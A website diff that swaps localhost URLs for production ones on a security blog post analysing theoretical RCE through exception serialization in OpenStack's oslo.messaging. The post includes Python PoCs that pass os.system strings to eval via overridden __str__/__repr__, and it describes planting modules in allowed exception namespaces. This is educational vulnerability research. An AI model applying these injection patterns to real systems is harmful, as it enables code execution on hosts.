@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en" dir="auto">
 
-<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<head><meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="robots" content="index, follow">
@@ -9,18 +9,19 @@
 <meta name="keywords" content="OpenStack, Nova, RCE, Vulnerability Analysis, oslo.messaging, Exception Serialization">
 <meta name="description" content="Analysis of potential Remote Code Execution vulnerability in OpenStack Nova&rsquo;s exception serialization mechanism, including multiple PoC scenarios and defense recommendations.">
 <meta name="author" content="">
-<link rel="canonical" href="http://localhost:1313/en/post/2025-06-10-rce-via-exception-serialization-in-openstack-nova/">
+<link rel="canonical" href="https://windshock.github.io/en/post/2025-06-10-rce-via-exception-serialization-in-openstack-nova/">
 <link href="https://fonts.googleapis.com/css2?family=Spectral:wght@400;700&display=swap" rel="stylesheet">
-<link rel="alternate" type="application/rss+xml" title="RSS" href="http://localhost:1313/index.xml" />
+<link rel="alternate" type="application/rss+xml" title="RSS" href="https://windshock.github.io/index.xml" />
 <link crossorigin="anonymous" href="/assets/css/stylesheet.f49d66caae9ea0fd43f21f29e71a8d3e284517ed770f2aa86fa012953ad3c9ef.css" integrity="sha256-9J1myq6eoP1D8h8p5xqNPihFF&#43;13Dyqob6ASlTrTye8=" rel="preload stylesheet" as="style">
-<link rel="icon" href="http://localhost:1313/favicon.ico">
-<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
-<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
-<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
-<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<link rel="icon" href="https://windshock.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://windshock.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://windshock.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://windshock.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://windshock.github.io/safari-pinned-tab.svg">
 <meta name="theme-color" content="#2e2e33">
 <meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" hreflang="en" href="http://localhost:1313/en/post/2025-06-10-rce-via-exception-serialization-in-openstack-nova/">
+<link rel="alternate" hreflang="en" href="https://windshock.github.io/en/post/2025-06-10-rce-via-exception-serialization-in-openstack-nova/">
+<link rel="alternate" hreflang="ko" href="https://windshock.github.io/ko/post/2025-06-10-rce-via-exception-serialization-in-openstack-nova/">
 
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.css" />
 <script defer src="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.js"></script>
@@ -62,6 +63,88 @@
 
     </style>
 </noscript>
+      <script async src="https://www.googletagmanager.com/gtag/js?id=G-6N6EEJ259T"></script>
+      <script>
+        var doNotTrack = false;
+        if ( false ) {
+          var dnt = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack);
+          var doNotTrack = (dnt == "1" || dnt == "yes");
+        }
+        if (!doNotTrack) {
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments);}
+          gtag('js', new Date());
+          gtag('config', 'G-6N6EEJ259T');
+        }
+      </script><meta property="og:url" content="https://windshock.github.io/en/post/2025-06-10-rce-via-exception-serialization-in-openstack-nova/">
+  <meta property="og:site_name" content="Code Before Breach">
+  <meta property="og:title" content="Exception Serialization Patterns in OpenStack Nova: Theoretical RCE Risks and Lessons Learned">
+  <meta property="og:description" content="Analysis of potential Remote Code Execution vulnerability in OpenStack Nova’s exception serialization mechanism, including multiple PoC scenarios and defense recommendations.">
+  <meta property="og:locale" content="en-US">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="post">
+    <meta property="article:published_time" content="2025-06-10T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-06-10T00:00:00+00:00">
+    <meta property="article:tag" content="OpenStack">
+    <meta property="article:tag" content="Nova">
+    <meta property="article:tag" content="RCE">
+    <meta property="article:tag" content="Vulnerability Analysis">
+    <meta property="article:tag" content="Oslo.messaging">
+    <meta property="article:tag" content="Exception Serialization">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Exception Serialization Patterns in OpenStack Nova: Theoretical RCE Risks and Lessons Learned">
+<meta name="twitter:description" content="Analysis of potential Remote Code Execution vulnerability in OpenStack Nova&rsquo;s exception serialization mechanism, including multiple PoC scenarios and defense recommendations.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://windshock.github.io/en/post/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Exception Serialization Patterns in OpenStack Nova: Theoretical RCE Risks and Lessons Learned",
+      "item": "https://windshock.github.io/en/post/2025-06-10-rce-via-exception-serialization-in-openstack-nova/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Exception Serialization Patterns in OpenStack Nova: Theoretical RCE Risks and Lessons Learned",
+  "name": "Exception Serialization Patterns in OpenStack Nova: Theoretical RCE Risks and Lessons Learned",
+  "description": "Analysis of potential Remote Code Execution vulnerability in OpenStack Nova\u0026rsquo;s exception serialization mechanism, including multiple PoC scenarios and defense recommendations.",
+  "keywords": [
+    "OpenStack", "Nova", "RCE", "Vulnerability Analysis", "oslo.messaging", "Exception Serialization"
+  ],
+  "articleBody": "Author: Hyeongkwan Lee\nEmail: windshock@gmail.com\nGitHub: https://github.com/windshock\nLinkedIn: https://www.linkedin.com/in/windshock/\nBlog: https://windshock.github.io\nXML-RPC Security Series:\nSeries 1 - XML-RPC Security Vulnerabilities Analysis and Mitigation Strategies Series 2 - CVE-2019-17570: Apache XML-RPC Exploit Series 3 - Exception Serialization Patterns in OpenStack Nova: Theoretical RCE Risks and Lessons Learned Overview This report analyzes theoretical Remote Code Execution (RCE) risks related to exception serialization and deserialization in OpenStack Nova’s use of the oslo.messaging library. The goal is not to claim that practical RCE is easily achievable, but to help security engineers and developers recognize anti-patterns and learn from them. Multiple real-world safeguards (such as module whitelisting, message broker isolation, and secure logging practices) make actual exploitation highly unlikely in production OpenStack environments. The following PoC scenarios are intended for educational purposes, to illustrate how insecure exception handling patterns could become risky if other defenses are misconfigured or absent.\nKey Findings Note: These PoCs are for educational demonstration of risky exception handling patterns. In real OpenStack deployments, multiple safeguards make actual exploitation highly unlikely.\n✅ PoC 1 – __str__ Override with eval(str(e)) (Theoretical Example) This proof-of-concept demonstrates, in a controlled example, that when an exception class overrides its __str__() method to return a malicious string, any call to eval(str(e)) could theoretically result in Remote Code Execution. In practice, such a pattern should never appear in production code, and OpenStack’s architecture includes multiple layers of defense.\nclass Evil(Exception): def __str__(self): return \"__import__('os').system('touch /tmp/from_str_eval')\" eval(str(Evil())) # Triggers RCE ✅ PoC 2 – __str__ Returns JSON Payload + eval (Theoretical Example) This variant shows, for educational purposes, how a __str__() method returning a JSON-encoded payload could, if mishandled, lead to code execution if the parsed content is used in an eval() call. Again, this is not a pattern seen in well-designed production systems, but highlights why input validation and secure exception handling are important.\nclass Evil(Exception): def __str__(self): return '{\"payload\": \"__import__(\\'os\\').system(\\'touch /tmp/json_rce\\')\"}' data = json.loads(str(Evil())) eval(data[\"payload\"]) # Triggers RCE ✅ PoC 3 – eval(repr(e)) (Theoretical Example) This PoC demonstrates, as a theoretical risk, that repr() can also be overridden to return arbitrary content. If any part of the system executes eval(repr(obj)) without ensuring that obj is a safe type, code execution could occur. This underscores that both __str__ and __repr__ must be considered attack surfaces in code reviews.\nclass Evil: def __repr__(self): return \"__import__('os').system('touch /tmp/hacked')\" eval(repr(Evil())) # RCE ✅ PoC 4 – Trigger via serialize_remote_exception() (Theoretical Example) Here, the PoC illustrates that if OpenStack’s serialize_remote_exception() function were to call str(e) on a malicious exception object, code execution could theoretically occur. In practice, OpenStack’s design and deployment mitigations make this scenario extremely unlikely.\nimport sys import os from oslo_messaging._drivers import common as exceptions class EvilError(Exception): def __str__(self): os.system(\"touch /tmp/hacked\") return \"rce via serialize\" try: raise EvilError(\"boom\") except Exception: exc_info = sys.exc_info() serialized = exceptions.serialize_remote_exception(exc_info) print(\"File created:\", os.path.exists(\"/tmp/hacked\")) → Malicious __str__() is executed within the serializer. ✅ PoC 5 – Race Condition with Threads (Theoretical Example) This experiment simulates a theoretical race condition scenario in which multiple threads concurrently deserialize and serialize exception objects. The test proves that when two threads (a producer and a consumer) access shared exceptions via a queue, the serializer thread may trigger str(ex) on a malicious object before it has been fully sanitized. As discussed below, this is not a realistic risk in actual OpenStack deployments.\nNote: In actual OpenStack oslo.messaging and Nova implementations, global variables or direct sharing of exception objects across threads or processes does not occur. Exception objects are always serialized and deserialized across process or network boundaries, meaning each thread or process works with its own instance. Therefore, the race condition demonstrated in this PoC does not represent a realistic risk in real-world OpenStack environments. This PoC should be considered a theoretical demonstration of Python concurrency issues, not a practical exploit vector for OpenStack.\nThis demonstrates the danger of using shared resources and exception objects across asynchronous or threaded boundaries without protective synchronization or trust boundaries. Even in environments with the GIL, race windows can expose critical bugs.\nLimitations of This PoC This PoC assumes shared mutable global state (hit_count), which is not typically used in production code.\nPython’s Global Interpreter Lock (GIL) limits true concurrency, so race conditions in CPython are often timing-dependent and may be less predictable.\nThe Boom object is explicitly crafted and passed across a shared queue without serialization boundaries; in real deployments, such objects would typically be serialized/deserialized across process or network boundaries, limiting direct reference reuse.\nNevertheless, this PoC illustrates the class of timing-sensitive bugs that arise from deserialization and stringification of attacker-influenced objects in multi-threaded environments.\nimport threading import os import time import random from queue import Queue import queue # for queue.Full exception # Shared resources hit_count = 0 ex_queue = Queue(maxsize=5) class Boom(Exception): def __str__(self): global hit_count local_count = hit_count print(f\"Thread {threading.current_thread().name} reading hit_count={local_count}\") time.sleep(random.uniform(0.001, 0.003)) # 1ms ~ 3ms delay hit_count = local_count + 1 print(f\"Thread {threading.current_thread().name} set hit_count={hit_count}\") os.system(f\"touch /tmp/hacked_race_{hit_count}_thread_{threading.current_thread().name}\") return f\"boom_{hit_count}\" def deserializer(): global hit_count while hit_count \u003c 5: ex = Boom() print(f\"Thread {threading.current_thread().name} created Boom\") try: ex_queue.put(ex, timeout=0.1) time.sleep(random.uniform(0.001, 0.003)) except queue.Full: time.sleep(random.uniform(0.001, 0.003)) continue def serializer(): global hit_count while hit_count \u003c 5: try: ex = ex_queue.get(timeout=0.3) print(f\"Thread {threading.current_thread().name} got Boom, calling str\") str(ex) # Triggers Boom.__str__ time.sleep(random.uniform(0.001, 0.003)) except Queue.Empty: time.sleep(random.uniform(0.001, 0.003)) continue # Minimal thread setup threads = [ threading.Thread(target=deserializer, name=f\"Deserializer-{i}\") for i in range(2) ] + [ threading.Thread(target=serializer, name=f\"Serializer-{i}\") for i in range(3) ] for t in threads: t.start() for t in threads: t.join(timeout=5) print(\"Final hit_count:\", hit_count) print(\"Generated files:\", sorted([f for f in os.listdir(\"/tmp\") if f.startswith(\"hacked_race_\")])) OpenStack-specific Vulnerability Context The vulnerable functions serialize_remote_exception() and deserialize_remote_exception() are part of the oslo.messaging library, not Nova itself. Nova uses them as part of its RPC communication and error-handling infrastructure. These functions are located in oslo_messaging/_drivers/common.py and are called by various RPC transport mechanisms. Because oslo.messaging is a shared library across OpenStack services, this vulnerability has implications beyond Nova if other components reuse the same serialization logic.\nserialize_remote_exception() This function serializes Python exceptions into a dictionary format for RPC transport. One critical line calls str(failure), which is the same as str(ex). If the exception object has an overridden __str__() method with side effects, this call can trigger arbitrary code execution. This makes the serialization process itself a potential RCE entry point, especially if exceptions are passed from untrusted sources or deserialized objects.\ndata = { 'class': cls_name, 'module': mod_name, 'message': str(failure), 'tb': tb, 'args': failure.args, 'kwargs': kwargs } deserialize_remote_exception() This function dynamically imports and reconstructs exception classes from RPC responses. It uses the module and class fields in the serialized data to locate the exception class and instantiate it with the provided arguments. While Nova restricts deserialization via allowed_remote_exmods, any misconfiguration or unsafe exception content (such as crafted __str__() methods) can still result in dangerous behavior if the reconstructed exception is logged or stringified later.\n_EXCEPTIONS_MODULE = 'builtins' _EXCEPTIONS_MODULES = ['exceptions', 'builtins'] if module in _EXCEPTIONS_MODULES: module = _EXCEPTIONS_MODULE if module != _EXCEPTIONS_MODULE and module not in allowed_remote_exmods: return RemoteError(name, message, traceback) mod = importutils.import_module(module) klass = getattr(mod, name) if not issubclass(klass, Exception): raise TypeError(...) exc = klass(*args, **kwargs) These functions expose str(e) as a potential RCE entry point if attacker-controlled classes are deserialized and logged.\nOpenStack Products and Custom Exception Namespaces In some OpenStack products such as Ironic, exceptions are not limited to the Python builtins but are often defined in product-specific namespaces. For example, Ironic and related components use their own exception modules, and the list of allowed exception namespaces may include values like:\nallowed_exception_namespaces = [ 'ironic_lib.exception.', 'ironic.common.exception.', 'ironic_inspector.utils.' ] See: Ironic JSON RPC Reference\nDue to Python’s import path resolution, if a local file exists that matches the expected module path (e.g., ironic/common/exception.py), that local file will be imported first. This means that if an attacker is able to upload or place a malicious exception file at the expected path, it could be loaded during deserialization. For example:\nfrom ironic.common import exception from oslo_messaging._drivers import common as exceptions e = '{\"class\": \"MyException\", \"module\": \"ironic.common.exception\", \"message\": \"\\uc5d0\\ub7ec: test\", \"tb\": [\"MyException: \\uc5d0\\ub7ec: test\\n\"], \"args\": [\"test\"], \"kwargs\": {}}' sys.modules['ironic.common.exception'] # ",
+  "wordCount" : "1615",
+  "inLanguage": "en",
+  "datePublished": "2025-06-10T00:00:00Z",
+  "dateModified": "2025-06-10T00:00:00Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://windshock.github.io/en/post/2025-06-10-rce-via-exception-serialization-in-openstack-nova/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Code Before Breach",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://windshock.github.io/favicon.ico"
+    }
+  }
+}
+</script>
 </head>
 
 <body class="" id="top">
@@ -79,8 +162,8 @@
 <header class="header">
     <nav class="nav">
         <div class="logo">
-            <a href="http://localhost:1313/en/" accesskey="h" title="Code Before Breach (Alt + H)">
-                <img src="http://localhost:1313/images/logo-terminal-animated.svg" alt="" aria-label="logo" class="h-7 w-auto"
+            <a href="https://windshock.github.io/en/" accesskey="h" title="Code Before Breach (Alt + H)">
+                <img src="https://windshock.github.io/images/logo-terminal-animated.svg" alt="" aria-label="logo" class="h-7 w-auto"
                     height="28">Code Before Breach</a>
             <div class="logo-switches">
                 <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
@@ -105,7 +188,7 @@
                 </button>
                 <ul class="lang-switch"><li>|</li>
                     <li>
-                        <a href="http://localhost:1313/ko/" title="한국어"
+                        <a href="https://windshock.github.io/ko/" title="한국어"
                             aria-label="한국어">Ko</a>
                     </li>
                 </ul>
@@ -113,32 +196,32 @@
         </div>
         <ul id="menu">
             <li>
-                <a href="http://localhost:1313/en/search/" title="Search (Alt &#43; /)" accesskey=/>
+                <a href="https://windshock.github.io/en/search/" title="Search (Alt &#43; /)" accesskey=/>
                     <span>Search</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/en/tags/" title="Tags">
+                <a href="https://windshock.github.io/en/tags/" title="Tags">
                     <span>Tags</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/en/categories/" title="Categories">
+                <a href="https://windshock.github.io/en/categories/" title="Categories">
                     <span>Categories</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/en/archives/" title="Archive">
+                <a href="https://windshock.github.io/en/archives/" title="Archive">
                     <span>Archive</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/en/about/" title="About">
+                <a href="https://windshock.github.io/en/about/" title="About">
                     <span>About</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/en/index.xml" title="RSS">
+                <a href="https://windshock.github.io/en/index.xml" title="RSS">
                     <span>RSS</span>
                 </a>
             </li>
@@ -152,11 +235,16 @@
 
 <article class="post-single">
   <header class="post-header">
-    <div class="breadcrumbs"><a href="http://localhost:1313/en/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/en/post/">Posts</a></div>
+    <div class="breadcrumbs"><a href="https://windshock.github.io/en/">Home</a>&nbsp;»&nbsp;<a href="https://windshock.github.io/en/post/">Posts</a></div>
     <h1 class="post-title entry-hint-parent">
       Exception Serialization Patterns in OpenStack Nova: Theoretical RCE Risks and Lessons Learned
     </h1>
-    <div class="post-meta"><span title='2025-06-10 00:00:00 +0000 UTC'>June 10, 2025</span>&nbsp;·&nbsp;8 min&nbsp;·&nbsp;1615 words
+    <div class="post-meta"><span title='2025-06-10 00:00:00 +0000 UTC'>June 10, 2025</span>&nbsp;·&nbsp;8 min&nbsp;·&nbsp;1615 words&nbsp;|&nbsp;Translations:
+<ul class="i18n_list">
+    <li>
+        <a href="https://windshock.github.io/ko/post/2025-06-10-rce-via-exception-serialization-in-openstack-nova/">Ko</a>
+    </li>
+</ul>
 
 </div>
   </header> <div class="toc">
@@ -476,15 +564,15 @@
 
   <footer class="post-footer">
     <ul class="post-tags">
-      <li><a href="http://localhost:1313/en/tags/openstack/">OpenStack</a></li>
-      <li><a href="http://localhost:1313/en/tags/nova/">Nova</a></li>
-      <li><a href="http://localhost:1313/en/tags/rce/">RCE</a></li>
-      <li><a href="http://localhost:1313/en/tags/vulnerability-analysis/">Vulnerability Analysis</a></li>
-      <li><a href="http://localhost:1313/en/tags/oslo.messaging/">Oslo.messaging</a></li>
-      <li><a href="http://localhost:1313/en/tags/exception-serialization/">Exception Serialization</a></li>
+      <li><a href="https://windshock.github.io/en/tags/openstack/">OpenStack</a></li>
+      <li><a href="https://windshock.github.io/en/tags/nova/">Nova</a></li>
+      <li><a href="https://windshock.github.io/en/tags/rce/">RCE</a></li>
+      <li><a href="https://windshock.github.io/en/tags/vulnerability-analysis/">Vulnerability Analysis</a></li>
+      <li><a href="https://windshock.github.io/en/tags/oslo.messaging/">Oslo.messaging</a></li>
+      <li><a href="https://windshock.github.io/en/tags/exception-serialization/">Exception Serialization</a></li>
     </ul>
 <nav class="paginav">
-  <a class="next" href="http://localhost:1313/en/post/2025-05-28-endpoint-security-evasion-techniques-20202025/">
+  <a class="next" href="https://windshock.github.io/en/post/2025-05-28-endpoint-security-evasion-techniques-20202025/">
     <span class="title">Next »</span>
     <br>
     <span>Endpoint Evasion Techniques (2020–2025): The Evolution of Attacks Bypassing EDR</span>
@@ -495,7 +583,7 @@
 <ul class="share-buttons">
     <li>
         <a target="_blank" rel="noopener noreferrer" aria-label="share Exception Serialization Patterns in OpenStack Nova: Theoretical RCE Risks and Lessons Learned on x"
-            href="https://x.com/intent/tweet/?text=Exception%20Serialization%20Patterns%20in%20OpenStack%20Nova%3a%20Theoretical%20RCE%20Risks%20and%20Lessons%20Learned&amp;url=http%3a%2f%2flocalhost%3a1313%2fen%2fpost%2f2025-06-10-rce-via-exception-serialization-in-openstack-nova%2f&amp;hashtags=OpenStack%2cNova%2cRCE%2cVulnerabilityAnalysis%2coslo.messaging%2cExceptionSerialization">
+            href="https://x.com/intent/tweet/?text=Exception%20Serialization%20Patterns%20in%20OpenStack%20Nova%3a%20Theoretical%20RCE%20Risks%20and%20Lessons%20Learned&amp;url=https%3a%2f%2fwindshock.github.io%2fen%2fpost%2f2025-06-10-rce-via-exception-serialization-in-openstack-nova%2f&amp;hashtags=OpenStack%2cNova%2cRCE%2cVulnerabilityAnalysis%2coslo.messaging%2cExceptionSerialization">
             <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                 <path
                     d="M512 62.554 L 512 449.446 C 512 483.97 483.97 512 449.446 512 L 62.554 512 C 28.03 512 0 483.97 0 449.446 L 0 62.554 C 0 28.03 28.029 0 62.554 0 L 449.446 0 C 483.971 0 512 28.03 512 62.554 Z M 269.951 190.75 L 182.567 75.216 L 56 75.216 L 207.216 272.95 L 63.9 436.783 L 125.266 436.783 L 235.9 310.383 L 332.567 436.783 L 456 436.783 L 298.367 228.367 L 432.367 75.216 L 371.033 75.216 Z M 127.633 110 L 164.101 110 L 383.481 400.065 L 349.5 400.065 Z" />
@@ -504,7 +592,7 @@
     </li>
     <li>
         <a target="_blank" rel="noopener noreferrer" aria-label="share Exception Serialization Patterns in OpenStack Nova: Theoretical RCE Risks and Lessons Learned on linkedin"
-            href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http%3a%2f%2flocalhost%3a1313%2fen%2fpost%2f2025-06-10-rce-via-exception-serialization-in-openstack-nova%2f&amp;title=Exception%20Serialization%20Patterns%20in%20OpenStack%20Nova%3a%20Theoretical%20RCE%20Risks%20and%20Lessons%20Learned&amp;summary=Exception%20Serialization%20Patterns%20in%20OpenStack%20Nova%3a%20Theoretical%20RCE%20Risks%20and%20Lessons%20Learned&amp;source=http%3a%2f%2flocalhost%3a1313%2fen%2fpost%2f2025-06-10-rce-via-exception-serialization-in-openstack-nova%2f">
+            href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fwindshock.github.io%2fen%2fpost%2f2025-06-10-rce-via-exception-serialization-in-openstack-nova%2f&amp;title=Exception%20Serialization%20Patterns%20in%20OpenStack%20Nova%3a%20Theoretical%20RCE%20Risks%20and%20Lessons%20Learned&amp;summary=Exception%20Serialization%20Patterns%20in%20OpenStack%20Nova%3a%20Theoretical%20RCE%20Risks%20and%20Lessons%20Learned&amp;source=https%3a%2f%2fwindshock.github.io%2fen%2fpost%2f2025-06-10-rce-via-exception-serialization-in-openstack-nova%2f">
             <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                 <path
                     d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
@@ -513,7 +601,7 @@
     </li>
     <li>
         <a target="_blank" rel="noopener noreferrer" aria-label="share Exception Serialization Patterns in OpenStack Nova: Theoretical RCE Risks and Lessons Learned on reddit"
-            href="https://reddit.com/submit?url=http%3a%2f%2flocalhost%3a1313%2fen%2fpost%2f2025-06-10-rce-via-exception-serialization-in-openstack-nova%2f&title=Exception%20Serialization%20Patterns%20in%20OpenStack%20Nova%3a%20Theoretical%20RCE%20Risks%20and%20Lessons%20Learned">
+            href="https://reddit.com/submit?url=https%3a%2f%2fwindshock.github.io%2fen%2fpost%2f2025-06-10-rce-via-exception-serialization-in-openstack-nova%2f&title=Exception%20Serialization%20Patterns%20in%20OpenStack%20Nova%3a%20Theoretical%20RCE%20Risks%20and%20Lessons%20Learned">
             <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                 <path
                     d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-3.446,265.638c0,-22.964 -18.616,-41.58 -41.58,-41.58c-11.211,0 -21.361,4.457 -28.841,11.666c-28.424,-20.508 -67.586,-33.757 -111.204,-35.278l18.941,-89.121l61.884,13.157c0.756,15.734 13.642,28.29 29.56,28.29c16.407,0 29.706,-13.299 29.706,-29.701c0,-16.403 -13.299,-29.702 -29.706,-29.702c-11.666,0 -21.657,6.792 -26.515,16.578l-69.105,-14.69c-1.922,-0.418 -3.939,-0.042 -5.585,1.036c-1.658,1.073 -2.811,2.761 -3.224,4.686l-21.152,99.438c-44.258,1.228 -84.046,14.494 -112.837,35.232c-7.468,-7.164 -17.589,-11.591 -28.757,-11.591c-22.965,0 -41.585,18.616 -41.585,41.58c0,16.896 10.095,31.41 24.568,37.918c-0.639,4.135 -0.99,8.328 -0.99,12.576c0,63.977 74.469,115.836 166.33,115.836c91.861,0 166.334,-51.859 166.334,-115.836c0,-4.218 -0.347,-8.387 -0.977,-12.493c14.564,-6.47 24.735,-21.034 24.735,-38.001Zm-119.474,108.193c-20.27,20.241 -59.115,21.816 -70.534,21.816c-11.428,0 -50.277,-1.575 -70.522,-21.82c-3.007,-3.008 -3.007,-7.882 0,-10.889c3.003,-2.999 7.882,-3.003 10.885,0c12.777,12.781 40.11,17.317 59.637,17.317c19.522,0 46.86,-4.536 59.657,-17.321c3.016,-2.999 7.886,-2.995 10.885,0.008c3.008,3.011 3.003,7.882 -0.008,10.889Zm-5.23,-48.781c-16.373,0 -29.701,-13.324 -29.701,-29.698c0,-16.381 13.328,-29.714 29.701,-29.714c16.378,0 29.706,13.333 29.706,29.714c0,16.374 -13.328,29.698 -29.706,29.698Zm-160.386,-29.702c0,-16.381 13.328,-29.71 29.714,-29.71c16.369,0 29.689,13.329 29.689,29.71c0,16.373 -13.32,29.693 -29.689,29.693c-16.386,0 -29.714,-13.32 -29.714,-29.693Z" />
@@ -522,7 +610,7 @@
     </li>
     <li>
         <a target="_blank" rel="noopener noreferrer" aria-label="share Exception Serialization Patterns in OpenStack Nova: Theoretical RCE Risks and Lessons Learned on facebook"
-            href="https://facebook.com/sharer/sharer.php?u=http%3a%2f%2flocalhost%3a1313%2fen%2fpost%2f2025-06-10-rce-via-exception-serialization-in-openstack-nova%2f">
+            href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fwindshock.github.io%2fen%2fpost%2f2025-06-10-rce-via-exception-serialization-in-openstack-nova%2f">
             <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                 <path
                     d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-106.468,0l0,-192.915l66.6,0l12.672,-82.621l-79.272,0l0,-53.617c0,-22.603 11.073,-44.636 46.58,-44.636l36.042,0l0,-70.34c0,0 -32.71,-5.582 -63.982,-5.582c-65.288,0 -107.96,39.569 -107.96,111.204l0,62.971l-72.573,0l0,82.621l72.573,0l0,192.915l-191.104,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Z" />
@@ -531,7 +619,7 @@
     </li>
     <li>
         <a target="_blank" rel="noopener noreferrer" aria-label="share Exception Serialization Patterns in OpenStack Nova: Theoretical RCE Risks and Lessons Learned on whatsapp"
-            href="https://api.whatsapp.com/send?text=Exception%20Serialization%20Patterns%20in%20OpenStack%20Nova%3a%20Theoretical%20RCE%20Risks%20and%20Lessons%20Learned%20-%20http%3a%2f%2flocalhost%3a1313%2fen%2fpost%2f2025-06-10-rce-via-exception-serialization-in-openstack-nova%2f">
+            href="https://api.whatsapp.com/send?text=Exception%20Serialization%20Patterns%20in%20OpenStack%20Nova%3a%20Theoretical%20RCE%20Risks%20and%20Lessons%20Learned%20-%20https%3a%2f%2fwindshock.github.io%2fen%2fpost%2f2025-06-10-rce-via-exception-serialization-in-openstack-nova%2f">
             <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                 <path
                     d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-58.673,127.703c-33.842,-33.881 -78.847,-52.548 -126.798,-52.568c-98.799,0 -179.21,80.405 -179.249,179.234c-0.013,31.593 8.241,62.428 23.927,89.612l-25.429,92.884l95.021,-24.925c26.181,14.28 55.659,21.807 85.658,21.816l0.074,0c98.789,0 179.206,-80.413 179.247,-179.243c0.018,-47.895 -18.61,-92.93 -52.451,-126.81Zm-126.797,275.782l-0.06,0c-26.734,-0.01 -52.954,-7.193 -75.828,-20.767l-5.441,-3.229l-56.386,14.792l15.05,-54.977l-3.542,-5.637c-14.913,-23.72 -22.791,-51.136 -22.779,-79.287c0.033,-82.142 66.867,-148.971 149.046,-148.971c39.793,0.014 77.199,15.531 105.329,43.692c28.128,28.16 43.609,65.592 43.594,105.4c-0.034,82.149 -66.866,148.983 -148.983,148.984Zm81.721,-111.581c-4.479,-2.242 -26.499,-13.075 -30.604,-14.571c-4.105,-1.495 -7.091,-2.241 -10.077,2.241c-2.986,4.483 -11.569,14.572 -14.182,17.562c-2.612,2.988 -5.225,3.364 -9.703,1.12c-4.479,-2.241 -18.91,-6.97 -36.017,-22.23c-13.314,-11.876 -22.304,-26.542 